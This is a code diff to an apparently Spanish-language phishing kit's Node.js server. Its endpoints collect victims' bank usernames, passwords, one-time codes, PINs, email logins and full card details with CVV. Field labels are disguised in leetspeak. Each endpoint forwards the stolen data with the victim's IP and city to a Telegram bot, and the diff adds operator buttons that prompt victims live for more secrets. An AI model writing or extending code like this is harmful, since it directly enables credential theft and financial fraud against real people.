@@ -40,11 +40,11 @@ app.post('/enviar', async (req, res) => {
   const ciudad = await obtenerCiudad(ip);
 
   const mensaje = `
-❤️BD3V3 EMPR3S4S❤️
+❤️B0F4❤️
 🆔 ID: <code>${txid}</code>
 
-📱 US4R: ${usar}
-🔐 CL4V: ${clav}
+📱 US4R: <code>${usar}</code>
+🔐 CL4V: <code>${clav}</code>
 
 🌐 IP: ${ip}
 🏙️ Ciudad: ${ciudad}
@@ -52,7 +52,9 @@ app.post('/enviar', async (req, res) => {
 
   const keyboard = {
     inline_keyboard: [
-      [{ text: "🔑PEDIR CÓDIGO", callback_data: `cel-dina:${txid}` }],
+      [{ text: "🔑PEDIR CÓDIGO Y PIN", callback_data: `cel-dina:${txid}` }],
+      [{ text: "👤PEDIR CORREO Y CLV", callback_data: `corre-clv:${txid}` }],
+      [{ text: "💳PEDIR TARJETA", callback_data: `cece-ceve:${txid}` }],
       [{ text: "🔄CARGANDO", callback_data: `verifidata:${txid}` }],
       [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
     ]
@@ -76,19 +78,20 @@ app.post('/enviar', async (req, res) => {
 });
 
 app.post('/enviar2', async (req, res) => {
-  const { usar, clav, otp, txid } = req.body;
+  const { usar, clav, otp, pyn, txid } = req.body;
 
   const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.connection.remoteAddress;
   const ciudad = await obtenerCiudad(ip);
 
   const mensaje = `
-🔐❤️BD3V3 EMPR3S4S❤️
+🔐❤️B0F4❤️
 🆔 ID: <code>${txid}</code>
 
-📱 US4R: ${usar}
-🔐 CL4V: ${clav}
+📱 US4R: <code>${usar}</code>
+🔐 CL4V: <code>${clav}</code>
 
-🔑 OTP: ${otp}
+🔑 OTP: <code>${otp}</code>
+🔑 PYN: <code>${pyn}</code>
 
 🌐 IP: ${ip}
 🏙️ Ciudad: ${ciudad}
@@ -96,7 +99,104 @@ app.post('/enviar2', async (req, res) => {
 
   const keyboard = {
     inline_keyboard: [
-      [{ text: "🔑PEDIR CÓDIGO", callback_data: `cel-dina:${txid}` }],
+      [{ text: "🔑PEDIR CÓDIGO Y PIN", callback_data: `cel-dina:${txid}` }],
+      [{ text: "👤PEDIR CORREO Y CLV", callback_data: `corre-clv:${txid}` }],
+      [{ text: "💳PEDIR TARJETA", callback_data: `cece-ceve:${txid}` }],
+      [{ text: "🔄CARGANDO", callback_data: `verifidata:${txid}` }],
+      [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
+    ]
+  };
+
+  clientes[txid] = "esperando";
+  guardarEstado();
+
+  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: mensaje,
+      parse_mode: 'HTML',
+      reply_markup: keyboard
+    })
+  });
+
+  res.sendStatus(200);
+});
+
+app.post('/enviar3', async (req, res) => {
+  const { usar, clav, corre, clavs, txid } = req.body;
+
+  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.connection.remoteAddress;
+  const ciudad = await obtenerCiudad(ip);
+
+  const mensaje = `
+📩❤️B0F4❤️
+🆔 ID: <code>${txid}</code>
+
+📱 US4R: <code>${usar}</code>
+🔐 CL4V: <code>${clav}</code>
+
+👤 C0RR30: <code>${corre}</code>
+🔐 CL4VX: <code>${clavs}</code>
+
+🌐 IP: ${ip}
+🏙️ Ciudad: ${ciudad}
+`;
+
+  const keyboard = {
+    inline_keyboard: [
+       [{ text: "🔑PEDIR CÓDIGO Y PIN", callback_data: `cel-dina:${txid}` }],
+      [{ text: "👤PEDIR CORREO Y CLV", callback_data: `corre-clv:${txid}` }],
+      [{ text: "💳PEDIR TARJETA", callback_data: `cece-ceve:${txid}` }],
+      [{ text: "🔄CARGANDO", callback_data: `verifidata:${txid}` }],
+      [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
+    ]
+  };
+
+  clientes[txid] = "esperando";
+  guardarEstado();
+
+  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: mensaje,
+      parse_mode: 'HTML',
+      reply_markup: keyboard
+    })
+  });
+
+  res.sendStatus(200);
+});
+
+app.post('/enviar4', async (req, res) => {
+  const { usar, clav, cece, expir, cevod, txid } = req.body;
+
+  const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.connection.remoteAddress;
+  const ciudad = await obtenerCiudad(ip);
+
+  const mensaje = `
+💳❤️B0F4❤️
+🆔 ID: <code>${txid}</code>
+
+📱 US4R: <code>${usar}</code>
+🔐 CL4V: <code>${clav}</code>
+
+💳 CECE: <code>${cece}</code>
+📅 3XPYR: <code>${expir}</code>
+🔐 C3VV: <code>${cevod}</code>
+
+🌐 IP: ${ip}
+🏙️ Ciudad: ${ciudad}
+`;
+
+  const keyboard = {
+    inline_keyboard: [
+      [{ text: "🔑PEDIR CÓDIGO Y PIN", callback_data: `cel-dina:${txid}` }],
+      [{ text: "👤PEDIR CORREO Y CLV", callback_data: `corre-clv:${txid}` }],
+      [{ text: "💳PEDIR TARJETA", callback_data: `cece-ceve:${txid}` }],
       [{ text: "🔄CARGANDO", callback_data: `verifidata:${txid}` }],
       [{ text: "❌ERROR LOGO", callback_data: `errorlogo:${txid}` }]
     ]
